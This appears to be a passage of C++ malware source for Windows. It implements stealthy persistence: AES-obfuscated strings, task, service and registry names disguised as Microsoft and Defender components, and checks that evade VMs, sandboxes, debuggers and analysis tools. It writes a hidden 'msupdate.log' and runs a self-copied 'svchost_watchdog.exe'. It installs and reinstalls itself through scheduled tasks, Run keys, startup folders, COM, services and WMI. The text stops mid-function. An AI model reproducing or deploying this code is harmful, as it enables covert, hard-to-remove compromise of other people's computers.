#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <random>
#include <algorithm>
#include <intrin.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <fstream>
#include <wbemidl.h>
#include <ntstatus.h>
#include "../common.h"
#include "../logger/file_logger.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "shell32.lib")

// AES encryption for string obfuscation
class AESObfuscator {
private:
    static constexpr size_t AES_KEY_SIZE = 32;
    static constexpr size_t AES_IV_SIZE = 16;
    static constexpr size_t AES_BLOCK_SIZE = 16;
    
    static bool GenerateRandomBytes(BYTE* buffer, DWORD size) {
        HCRYPTPROV hCryptProv;
        if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            return false;
        }
        
        bool success = CryptGenRandom(hCryptProv, size, buffer);
        CryptReleaseContext(hCryptProv, 0);
        return success;
    }
    
    static std::vector<BYTE> DeriveKeyFromEntropy() {
        std::vector<BYTE> entropy;
        
        // Collect system entropy
        LARGE_INTEGER counter;
        QueryPerformanceCounter(&counter);
        BYTE* counterBytes = reinterpret_cast<BYTE*>(&counter.QuadPart);
        entropy.insert(entropy.end(), counterBytes, counterBytes + sizeof(counter.QuadPart));
        
        DWORD tickCount = GetTickCount();
        BYTE* tickBytes = reinterpret_cast<BYTE*>(&tickCount);
        entropy.insert(entropy.end(), tickBytes, tickBytes + sizeof(tickCount));
        
        DWORD processId = GetCurrentProcessId();
        BYTE* pidBytes = reinterpret_cast<BYTE*>(&processId);
        entropy.insert(entropy.end(), pidBytes, pidBytes + sizeof(processId));
        
        // Use SHA-256 to derive key from entropy
        std::vector<BYTE> key(AES_KEY_SIZE);
        BCRYPT_ALG_HANDLE hAlg;
        BCRYPT_HASH_HANDLE hHash;
        
        if (NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0))) {
            if (NT_SUCCESS(BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0))) {
                BCryptHashData(hHash, entropy.data(), (ULONG)entropy.size(), 0);
                BCryptFinishHash(hHash, key.data(), AES_KEY_SIZE, 0);
                BCryptDestroyHash(hHash);
            }
            BCryptCloseAlgorithmProvider(hAlg, 0);
        }
        
        return key;
    }
    
public:
    static std::vector<BYTE> Encrypt(const std::string& plaintext) {
        std::vector<BYTE> key = DeriveKeyFromEntropy();
        std::vector<BYTE> iv(AES_IV_SIZE);
        GenerateRandomBytes(iv.data(), AES_IV_SIZE);
        
        BCRYPT_ALG_HANDLE hAlg;
        BCRYPT_KEY_HANDLE hKey;
        
        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) {
            return {};
        }
        
        if (!NT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
                                         (PBYTE)BCRYPT_CHAIN_MODE_CBC, 
                                         sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return {};
        }
        
        if (!NT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, 
                                                   key.data(), AES_KEY_SIZE, 0))) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return {};
        }
        
        // Pad plaintext to block size
        std::string paddedText = plaintext;
        size_t padding = AES_BLOCK_SIZE - (paddedText.length() % AES_BLOCK_SIZE);
        paddedText.append(padding, static_cast<char>(padding));
        
        DWORD encryptedSize;
        BCryptEncrypt(hKey, (PUCHAR)paddedText.c_str(), (ULONG)paddedText.length(), 
                     NULL, iv.data(), AES_IV_SIZE, NULL, 0, &encryptedSize, BCRYPT_BLOCK_PADDING);
        
        std::vector<BYTE> encrypted(encryptedSize);
        if (NT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)paddedText.c_str(), (ULONG)paddedText.length(),
                                    NULL, iv.data(), AES_IV_SIZE, encrypted.data(), 
                                    encryptedSize, &encryptedSize, BCRYPT_BLOCK_PADDING))) {
            
            // Prepend IV to encrypted data
            std::vector<BYTE> result;
            result.insert(result.end(), iv.begin(), iv.end());
            result.insert(result.end(), encrypted.begin(), encrypted.end());
            
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return result;
        }
        
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }
    
    static std::string Decrypt(const std::vector<BYTE>& ciphertext) {
        if (ciphertext.size() < AES_IV_SIZE) return "";
        
        std::vector<BYTE> key = DeriveKeyFromEntropy();
        std::vector<BYTE> iv(ciphertext.begin(), ciphertext.begin() + AES_IV_SIZE);
        std::vector<BYTE> encrypted(ciphertext.begin() + AES_IV_SIZE, ciphertext.end());
        
        BCRYPT_ALG_HANDLE hAlg;
        BCRYPT_KEY_HANDLE hKey;
        
        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) {
            return "";
        }
        
        if (!NT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
                                         (PBYTE)BCRYPT_CHAIN_MODE_CBC, 
                                         sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return "";
        }
        
        if (!NT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, 
                                                   key.data(), AES_KEY_SIZE, 0))) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return "";
        }
        
        DWORD decryptedSize;
        BCryptDecrypt(hKey, encrypted.data(), (ULONG)encrypted.size(), NULL, 
                     iv.data(), AES_IV_SIZE, NULL, 0, &decryptedSize, BCRYPT_BLOCK_PADDING);
        
        std::vector<BYTE> decrypted(decryptedSize);
        if (NT_SUCCESS(BCryptDecrypt(hKey, encrypted.data(), (ULONG)encrypted.size(), NULL,
                                    iv.data(), AES_IV_SIZE, decrypted.data(), 
                                    decryptedSize, &decryptedSize, BCRYPT_BLOCK_PADDING))) {
            
            // Remove padding
            if (decryptedSize > 0) {
                BYTE padding = decrypted[decryptedSize - 1];
                if (padding <= AES_BLOCK_SIZE && padding <= decryptedSize) {
                    decryptedSize -= padding;
                }
            }
            
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return std::string(decrypted.begin(), decrypted.begin() + decryptedSize);
        }
        
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }
};

#define OBFSTR(str) []() -> std::string { \
    static std::vector<BYTE> encrypted; \
    static bool initialized = false; \
    if (!initialized) { \
        encrypted = AESObfuscator::Encrypt(str); \
        initialized = true; \
    } \
    return AESObfuscator::Decrypt(encrypted); \
}()

// Advanced runtime string obfuscation
class AdvancedObfuscator {
public:
    static std::wstring GetRandomTaskName() {
        std::vector<std::wstring> legitimateNames = {
            L"Microsoft Windows Search Indexer",
            L"Windows Security Health Service",
            L"Microsoft Edge Update Service",
            L"Windows Defender Antivirus Service",
            L"Microsoft Office Background Task Handler",
            L"Windows Update Medic Service",
            L"Microsoft Store Install Service"
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, legitimateNames.size() - 1);
        
        return legitimateNames[dis(gen)];
    }
    
    static std::wstring GetRandomServiceName() {
        std::vector<std::wstring> names = {
            L"WinDefend", L"wscsvc", L"WSearch", L"edgeupdate",
            L"MicrosoftEdgeElevationService", L"WinHTTPAutoProxySvc"
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, names.size() - 1);
        
        return names[dis(gen)];
    }
    
    static std::wstring GetRandomRegistryName() {
        std::vector<std::wstring> names = {
            L"SecurityHealthSystray", L"EdgeUpdate", L"WindowsDefender",
            L"MicrosoftEdgeAutoLaunch", L"OfficeBackgroundTaskHandler"
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, names.size() - 1);
        
        return names[dis(gen)];
    }
};

// Anti-analysis and environment detection
class AntiAnalysis {
public:
    static bool IsAnalysisEnvironment() {
        return IsVirtualMachine() || IsSandbox() || IsDebuggerPresent() || HasAnalysisTools();
    }
    
    static bool IsVirtualMachine() {
        // Check for VM artifacts
        std::vector<std::wstring> vmProcesses = {
            L"vmtoolsd.exe", L"vboxservice.exe", L"VGAuthService.exe",
            L"vmwaretray.exe", L"vmwareuser.exe", L"vboxtray.exe"
        };
        
        return HasAnyProcess(vmProcesses);
    }
    
    static bool IsSandbox() {
        // Check for sandbox indicators
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        
        // Sandboxes often have limited RAM
        if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { // Less than 2GB
            return true;
        }
        
        // Check for sandbox-specific files
        std::vector<std::wstring> sandboxFiles = {
            L"C:\\analysis", L"C:\\iDEFENSE", L"C:\\cuckoo",
            L"C:\\malware", L"C:\\sandbox"
        };
        
        for (const auto& file : sandboxFiles) {
            if (GetFileAttributesW(file.c_str()) != INVALID_FILE_ATTRIBUTES) {
                return true;
            }
        }
        
        return false;
    }
    
    static bool HasAnalysisTools() {
        std::vector<std::wstring> analysisTools = {
            L"ollydbg.exe", L"ida.exe", L"ida64.exe", L"x32dbg.exe", L"x64dbg.exe",
            L"wireshark.exe", L"fiddler.exe", L"processhacker.exe", L"procmon.exe",
            L"tcpview.exe", L"autoruns.exe", L"regshot.exe", L"pestudio.exe"
        };
        
        return HasAnyProcess(analysisTools);
    }
    
private:
    static bool HasAnyProcess(const std::vector<std::wstring>& processNames) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        
        bool found = false;
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                std::wstring processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::towlower);
                
                for (auto toolName : processNames) {
                    std::transform(toolName.begin(), toolName.end(), toolName.begin(), ::towlower);
                    if (processName == toolName) {
                        found = true;
                        break;
                    }
                }
                if (found) break;
            } while (Process32NextW(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return found;
    }
};

// Enhanced logging system with detailed error reporting
class Logger {
public:
    enum Level { LOG_DEBUG = 0, LOG_INFO = 1, LOG_WARNING = 2, LOG_ERROR = 3, LOG_CRITICAL = 4 };
    
    static void Log(Level level, const std::string& message, DWORD errorCode = 0) {
        if (!ShouldLog(level)) return;
        
        std::string logEntry = FormatLogEntry(level, message, errorCode);
        
        #ifdef _DEBUG
        OutputDebugStringA(logEntry.c_str());
        #endif
        
        // Write to multiple locations for reliability
        WriteToFile(logEntry);
        
        // For critical errors, also write to Windows Event Log
        if (level >= LOG_ERROR) {
            WriteToEventLog(level, message, errorCode);
        }
    }
    
    static void LogWithContext(Level level, const std::string& operation, 
                              const std::string& details, DWORD errorCode = 0) {
        std::string contextMessage = "[" + operation + "] " + details;
        if (errorCode != 0) {
            contextMessage += " - " + GetDetailedErrorMessage(errorCode);
        }
        Log(level, contextMessage, errorCode);
    }
    
    static void LogSystemInfo() {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        
        OSVERSIONINFOW osInfo;
        osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
        GetVersionExW(&osInfo);
        
        char sysInfoMsg[512];
        sprintf_s(sysInfoMsg, "System: Windows %lu.%lu.%lu, Processors: %lu, Architecture: %u",
                 osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber,
                 sysInfo.dwNumberOfProcessors, sysInfo.wProcessorArchitecture);
        
        Log(LOG_INFO, sysInfoMsg);
        
        // Log privilege level
        Log(LOG_INFO, std::string("Running as: ") + (Utils::IsUserAdmin() ? "Administrator" : "Standard User"));
    }
    
    static void SetLevel(Level level) {
        currentLevel = level;
    }
    
    static void RotateLogFiles() {
        WCHAR tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        
        std::wstring logFile = std::wstring(tempPath) + L"msupdate.log";
        std::wstring backupFile = std::wstring(tempPath) + L"msupdate.log.bak";
        
        // Check file size
        HANDLE hFile = CreateFileW(logFile.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER fileSize;
            if (GetFileSizeEx(hFile, &fileSize) && fileSize.QuadPart > 1024 * 1024) { // 1MB
                CloseHandle(hFile);
                DeleteFileW(backupFile.c_str());
                MoveFileW(logFile.c_str(), backupFile.c_str());
                Log(LOG_INFO, "Log file rotated");
            } else {
                CloseHandle(hFile);
            }
        }
    }

private:
    static Level currentLevel;
    
    static bool ShouldLog(Level level) {
        return level >= currentLevel;
    }
    
    static std::string GetDetailedErrorMessage(DWORD errorCode) {
        if (errorCode == 0) return "Success";
        
        LPSTR messageBuffer = nullptr;
        size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                    NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
                                    (LPSTR)&messageBuffer, 0, NULL);
        
        std::string message(messageBuffer, size);
        LocalFree(messageBuffer);
        
        // Remove trailing newlines
        message.erase(message.find_last_not_of("\r\n") + 1);
        
        return message + " (0x" + std::to_string(errorCode) + ")";
    }
    
    static std::string FormatLogEntry(Level level, const std::string& message, DWORD errorCode) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        
        char timestamp[64];
        sprintf_s(timestamp, "[%04d-%02d-%02d %02d:%02d:%02d.%03d] ",
                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
        
        std::string levelStr;
        switch (level) {
            case LOG_DEBUG: levelStr = "DEBUG"; break;
            case LOG_INFO: levelStr = "INFO "; break;
            case LOG_WARNING: levelStr = "WARN "; break;
            case LOG_ERROR: levelStr = "ERROR"; break;
            case LOG_CRITICAL: levelStr = "CRIT "; break;
        }
        
        std::string result = timestamp + levelStr + ": " + message;
        
        if (errorCode != 0) {
            result += " [" + GetDetailedErrorMessage(errorCode) + "]";
        }
        
        // Add process and thread IDs for debugging
        result += " (PID:" + std::to_string(GetCurrentProcessId()) + 
                 ", TID:" + std::to_string(GetCurrentThreadId()) + ")";
        
        result += "\n";
        
        return result;
    }
    
    static void WriteToFile(const std::string& entry) {
        WCHAR tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        
        std::wstring logFile = std::wstring(tempPath) + L"msupdate.log";
        
        HANDLE hFile = CreateFileW(logFile.c_str(), GENERIC_WRITE, FILE_SHARE_READ,
                                  NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            SetFilePointer(hFile, 0, NULL, FILE_END);
            DWORD written;
            WriteFile(hFile, entry.c_str(), (DWORD)entry.length(), &written, NULL);
            CloseHandle(hFile);
        }
    }
    
    static void WriteToEventLog(Level level, const std::string& message, DWORD errorCode) {
        HANDLE hEventLog = RegisterEventSourceA(NULL, "Application");
        if (hEventLog) {
            WORD eventType;
            switch (level) {
                case LOG_ERROR:
                case LOG_CRITICAL:
                    eventType = EVENTLOG_ERROR_TYPE;
                    break;
                case LOG_WARNING:
                    eventType = EVENTLOG_WARNING_TYPE;
                    break;
                default:
                    eventType = EVENTLOG_INFORMATION_TYPE;
                    break;
            }
            
            std::string fullMessage = "Advanced Persistence: " + message;
            if (errorCode != 0) {
                fullMessage += " (Error: " + std::to_string(errorCode) + ")";
            }
            
            const char* strings[] = { fullMessage.c_str() };
            ReportEventA(hEventLog, eventType, 0, 1000, NULL, 1, 0, strings, NULL);
            
            DeregisterEventSource(hEventLog);
        }
    }
};

Logger::Level Logger::currentLevel = Logger::LOG_INFO;

// Controlled watchdog process manager with exit conditions
class WatchdogManager {
private:
    static HANDLE hWatchdogProcess;
    static bool watchdogRunning;
    static DWORD maxWatchdogRuntime; // Maximum runtime in milliseconds
    static DWORD watchdogStartTime;
    static std::wstring watchdogPath;
    
public:
    static void SetMaxRuntime(DWORD milliseconds) {
        maxWatchdogRuntime = milliseconds;
    }
    
    static bool CreateWatchdogProcess(const std::wstring& targetPath) {
        if (watchdogRunning && IsWatchdogRunning()) {
            Logger::LogWithContext(Logger::LOG_INFO, "Watchdog", "Already running");
            return true;
        }
        
        // Clean up previous watchdog if exists
        if (hWatchdogProcess) {
            CloseHandle(hWatchdogProcess);
            hWatchdogProcess = NULL;
        }
        
        // Create watchdog as separate process
        WCHAR tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        
        watchdogPath = std::wstring(tempPath) + L"svchost_watchdog.exe";
        
        // Copy current executable as watchdog with verification
        if (!CopyFileW(targetPath.c_str(), watchdogPath.c_str(), FALSE)) {
            Logger::LogWithContext(Logger::LOG_ERROR, "Watchdog", "Failed to create watchdog copy", GetLastError());
            return false;
        }
        
        // Start watchdog process with controlled parameters
        STARTUPINFOW si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        
        // Pass max runtime as parameter
        std::wstring cmdLine = L"\"" + watchdogPath + L"\" /watchdog \"" + targetPath + 
                              L"\" /maxtime " + std::to_wstring(maxWatchdogRuntime);
        
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        if (CreateProcessW(NULL, const_cast<LPWSTR>(cmdLine.c_str()), NULL, NULL, FALSE,
                          CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
            hWatchdogProcess = pi.hProcess;
            CloseHandle(pi.hThread);
            watchdogRunning = true;
            watchdogStartTime = GetTickCount();
            
            Logger::LogWithContext(Logger::LOG_INFO, "Watchdog", 
                                 "Process created successfully (PID: " + std::to_string(pi.dwProcessId) + ")");
            return true;
        }
        
        Logger::LogWithContext(Logger::LOG_ERROR, "Watchdog", "Failed to create watchdog process", GetLastError());
        DeleteFileW(watchdogPath.c_str()); // Clean up on failure
        return false;
    }
    
    static bool IsWatchdogRunning() {
        if (!watchdogRunning || !hWatchdogProcess) return false;
        
        // Check if watchdog exceeded maximum runtime
        if (maxWatchdogRuntime > 0) {
            DWORD currentTime = GetTickCount();
            if (currentTime - watchdogStartTime > maxWatchdogRuntime) {
                Logger::LogWithContext(Logger::LOG_WARNING, "Watchdog", "Exceeded maximum runtime, terminating");
                StopWatchdog();
                return false;
            }
        }
        
        DWORD exitCode;
        if (GetExitCodeProcess(hWatchdogProcess, &exitCode)) {
            if (exitCode != STILL_ACTIVE) {
                Logger::LogWithContext(Logger::LOG_INFO, "Watchdog", 
                                     "Process exited with code: " + std::to_string(exitCode));
                watchdogRunning = false;
                CloseHandle(hWatchdogProcess);
                hWatchdogProcess = NULL;
                
                // Clean up watchdog file
                if (!watchdogPath.empty()) {
                    DeleteFileW(watchdogPath.c_str());
                }
                
                return false;
            }
            return true;
        }
        
        Logger::LogWithContext(Logger::LOG_ERROR, "Watchdog", "Failed to get process exit code", GetLastError());
        return false;
    }
    
    static void StopWatchdog() {
        if (hWatchdogProcess) {
            Logger::LogWithContext(Logger::LOG_INFO, "Watchdog", "Terminating watchdog process");
            
            // Try graceful shutdown first
            if (!TerminateProcess(hWatchdogProcess, 0)) {
                Logger::LogWithContext(Logger::LOG_WARNING, "Watchdog", "Failed to terminate gracefully", GetLastError());
            }
            
            // Wait for process to exit
            WaitForSingleObject(hWatchdogProcess, 5000); // 5 second timeout
            
            CloseHandle(hWatchdogProcess);
            hWatchdogProcess = NULL;
            watchdogRunning = false;
            
            // Clean up watchdog file
            if (!watchdogPath.empty()) {
                if (DeleteFileW(watchdogPath.c_str())) {
                    Logger::LogWithContext(Logger::LOG_INFO, "Watchdog", "Cleaned up watchdog file");
                } else {
                    Logger::LogWithContext(Logger::LOG_WARNING, "Watchdog", "Failed to delete watchdog file", GetLastError());
                    // Schedule for deletion on reboot
                    MoveFileExW(watchdogPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                }
                watchdogPath.clear();
            }
        }
    }
    
    static bool ShouldCreateWatchdog() {
        // Don't create watchdog in analysis environments
        if (AntiAnalysis::IsAnalysisEnvironment()) {
            Logger::LogWithContext(Logger::LOG_INFO, "Watchdog", "Skipping due to analysis environment");
            return false;
        }
        
        // Don't create too many watchdog processes
        static int watchdogCount = 0;
        if (watchdogCount >= 3) {
            Logger::LogWithContext(Logger::LOG_WARNING, "Watchdog", "Maximum watchdog instances reached");
            return false;
        }
        
        watchdogCount++;
        return true;
    }
};

HANDLE WatchdogManager::hWatchdogProcess = NULL;
bool WatchdogManager::watchdogRunning = false;
DWORD WatchdogManager::maxWatchdogRuntime = 3600000; // 1 hour default
DWORD WatchdogManager::watchdogStartTime = 0;
std::wstring WatchdogManager::watchdogPath = L"";

// Main persistence class with all improvements
class AdvancedPersistence {
private:
    std::wstring executablePath;
    std::wstring targetPath;
    std::wstring userTargetPath;
    std::vector<std::wstring> fallbackPaths;
    std::vector<std::wstring> installedMethods;
    std::vector<std::wstring> successfulCopies;
    bool isAdmin;
    bool analysisDetected;
    
public:
    AdvancedPersistence() {
        // Initialize logging
        Logger::SetLevel(Logger::LOG_INFO);
        Logger::RotateLogFiles();
        Logger::LogSystemInfo();
        
        // Get current executable path
        WCHAR path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        executablePath = path;
        
        isAdmin = Utils::IsUserAdmin();
        analysisDetected = AntiAnalysis::IsAnalysisEnvironment();
        
        GenerateTargetPaths();
        
        Logger::LogWithContext(Logger::LOG_INFO, "Initialization", "Advanced persistence initialized");
        Logger::LogWithContext(Logger::LOG_INFO, "Environment", 
                              std::string("Admin: ") + (isAdmin ? "Yes" : "No") + 
                              ", Analysis detected: " + (analysisDetected ? "Yes" : "No"));
        
        if (analysisDetected) {
            Logger::LogWithContext(Logger::LOG_WARNING, "Security", "Analysis environment detected - reduced functionality");
        }
    }
    
    ~AdvancedPersistence() {
        // Optional cleanup for testing
        #ifdef _DEBUG
        if (ShouldSelfDelete()) {
            PerformCleanup();
        }
        #endif
    }
    
    bool InstallPersistence() {
        Logger::LogWithContext(Logger::LOG_INFO, "Installation", "Installing persistence mechanisms");
        
        if (analysisDetected) {
            Logger::LogWithContext(Logger::LOG_WARNING, "Security", "Skipping persistence due to analysis environment");
            return false;
        }
        
        bool success = false;
        
        // Copy executable to target locations
        if (CopyToTargetLocations()) {
            success = true;
        }
        
        // Install user-level persistence (always available)
        if (CreateEnhancedScheduledTask()) {
            installedMethods.push_back(L"TaskScheduler");
            success = true;
        }
        
        if (CreateEnhancedRegistryEntry()) {
            installedMethods.push_back(L"Registry");
            success = true;
        }
        
        if (CreateEnhancedStartupEntry()) {
            installedMethods.push_back(L"Startup");
            success = true;
        }
        
        if (InstallCOMPersistence()) {
            installedMethods.push_back(L"COM");
            success = true;
        }
        
        // Admin-level persistence
        if (isAdmin) {
            if (InstallServicePersistence()) {
                installedMethods.push_back(L"Service");
                success = true;
            }
            
            if (InstallAdvancedRegistryMethods()) {
                installedMethods.push_back(L"AdvancedRegistry");
                success = true;
            }
            
            if (InstallWMIPersistence()) {
                installedMethods.push_back(L"WMI");
                success = true;
            }
        } else {
            Logger::LogWithContext(Logger::LOG_INFO, "Installation", "Non-admin mode - using user-level persistence only");
        }
        
        // Install controlled watchdog with conditions
        if (success && WatchdogManager::ShouldCreateWatchdog()) {
            WatchdogManager::SetMaxRuntime(3600000); // 1 hour maximum
            std::wstring watchdogTarget = !successfulCopies.empty() ? successfulCopies[0] : 
                                         (isAdmin ? targetPath : userTargetPath);
            WatchdogManager::CreateWatchdogProcess(watchdogTarget);
        }
        
        Logger::LogWithContext(Logger::LOG_INFO, "Installation", 
                             "Persistence installation completed", success ? 0 : GetLastError());
        return success;
    }
    
    // Comprehensive verification methods using WinAPI
    bool VerifyScheduledTask();
    bool VerifyRegistryEntry();
    bool VerifyStartupEntry();
    bool VerifyServiceEntry();
    bool VerifyCOMPersistence();
    bool VerifyAdvancedRegistry();
    
    // Helper methods
    bool VerifyFileIntegrity(const std::wstring& filePath);
    bool CopyFileWithVerification(const std::wstring& source, const std::wstring& dest);
    bool CreateDirectoryRecursive(const std::wstring& filePath);
    
    bool VerifyPersistence() {
        Logger::LogWithContext(Logger::LOG_INFO, "Verification", "Starting persistence verification");
        
        bool allValid = true;
        int verifiedCount = 0;
        int totalMethods = installedMethods.size();
        
        for (const auto& method : installedMethods) {
            bool isValid = false;
            
            Logger::LogWithContext(Logger::LOG_DEBUG, "Verification", "Checking method: " + 
                                 std::string(method.begin(), method.end()));
            
            if (method == L"TaskScheduler") {
                isValid = VerifyScheduledTask();
                if (!isValid) {
                    Logger::LogWithContext(Logger::LOG_WARNING, "Verification", "Task scheduler failed, attempting reinstall");
                    if (CreateEnhancedScheduledTask()) {
                        isValid = VerifyScheduledTask(); // Re-verify after reinstall
                    }
                }
            }
            else if (method == L"Registry") {
                isValid = VerifyRegistryEntry();
                if (!isValid) {
                    Logger::LogWithContext(Logger::LOG_WARNING, "Verification", "Registry failed, attempting reinstall");
                    if (CreateEnhancedRegistryEntry()) {
                        isValid = VerifyRegistryEntry(); // Re-verify after reinstall
                    }
                }
            }
            else if (method == L"Startup") {
                isValid = VerifyStartupEntry();
                if (!isValid) {
                    Logger::LogWithContext(Logger::LOG_WARNING, "Verification", "Startup failed, attempting reinstall");
                    if (CreateEnhancedStartupEntry()) {
                        isValid = VerifyStartupEntry(); // Re-verify after reinstall
                    }
                }
            }
            else if (method == L"Service" && isAdmin) {
                isValid = VerifyServiceEntry();
                if (!isValid) {
                    Logger::LogWithContext(Logger::LOG_WARNING, "Verification", "Service failed, attempting reinstall");
                    if (InstallServicePersistence()) {
                        isValid = VerifyServiceEntry(); // Re-verify after reinstall
                    }
                }
            }
            else if (method == L"COM" && isAdmin) {
                isValid = VerifyCOMPersistence();
                if (!isValid) {
                    Logger::LogWithContext(Logger::LOG_WARNING, "Verification", "COM failed, attempting reinstall");
                    if (InstallCOMPersistence()) {
                        isValid = VerifyCOMPersistence(); // Re-verify after reinstall
                    }
                }
            }
            else if (method == L"AdvancedRegistry" && isAdmin) {
                isValid = VerifyAdvancedRegistry();
                if (!isValid) {
                    Logger::LogWithContext(Logger::LOG_WARNING, "Verification", "Advanced registry failed, attempting reinstall");
                    if (InstallAdvancedRegistryMethods()) {
                        isValid = VerifyAdvancedRegistry(); // Re-verify after reinstall
                    }
                }
            }
            else if (method == L"WMI" && isAdmin) {
                // WMI verification would be complex - simplified check
                isValid = true; // Placeholder - would need WMI query implementation
                Logger::LogWithContext(Logger::LOG_INFO, "Verification", "WMI verification skipped (complex)");
            }
            
            if (isValid) {
                verifiedCount++;
                Logger::LogWithContext(Logger::LOG_INFO, "Verification", "Method verified: " + 
                                     std::string(method.begin(), method.end()));
            } else {
                allValid = false;
                Logger::LogWithContext(Logger::LOG_ERROR, "Verification", "Method failed verification: " + 
                                     std::string(method.begin(), method.end()));
            }
        }
        
        // Verify copied files still exist
        int validFiles = 0;
        for (const auto& filePath : successfulCopies) {
            if (GetFileAttributesW(filePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                if (VerifyFileIntegrity(filePath)) {
                    validFiles++;
                } else {
                    Logger::LogWithContext(Logger::LOG_WARNING, "Verification", 
                                         "File integrity failed: " + std::string(filePath.begin(), filePath.end()));
                }
            } else {
                Logger::LogWithContext(Logger::LOG_WARNING, "Verification", 
                                     "File missing: " + std::string(filePath.begin(), filePath.end()));
            }
        }
        
        // Check watchdog with controlled restart
        bool watchdogValid = false;
        if (WatchdogManager::IsWatchdogRunning()) {
            watchdogValid = true;
            Logger::LogWithContext(Logger::LOG_INFO, "Verification", "Watchdog is running");
        } else if (WatchdogManager::ShouldCreateWatchdog()) {
            std::wstring watchdogTarget = !successfulCopies.empty() ? successfulCopies[0] : 
                                         (isAdmin ? targetPath : userTargetPath);
            if (WatchdogManager::CreateWatchdogProcess(watchdogTarget)) {
                watchdogValid = true;
                Logger::LogWithContext(Logger::LOG_INFO, "Verification", "Watchdog restarted successfully");
            } else {
                Logger::LogWithContext(Logger::LOG_WARNING, "Verification", "Failed to restart watchdog");
            }
        } else {
            Logger::LogWithContext(Logger::LOG_INFO, "Verification", "Watchdog creation skipped (conditions not met)");
        }
        
        // Summary logging
        Logger::LogWithContext(Logger::LOG_INFO, "Verification", 
                             "Summary: " + std::to_string(verifiedCount) + "/" + std::to_string(totalMethods) + 
                             " methods verified, " + std::to_string(validFiles) + "/" + std::to_string(successfulCopies.size()) + 
                             " files valid, watchdog: " + (watchdogValid ? "OK" : "FAIL"));
        
        return allValid && (validFiles > 0);
    }
    
    // Comprehensive verification of all possible persistence methods (not just installed ones)
    bool VerifyAllPersistenceMethods() {
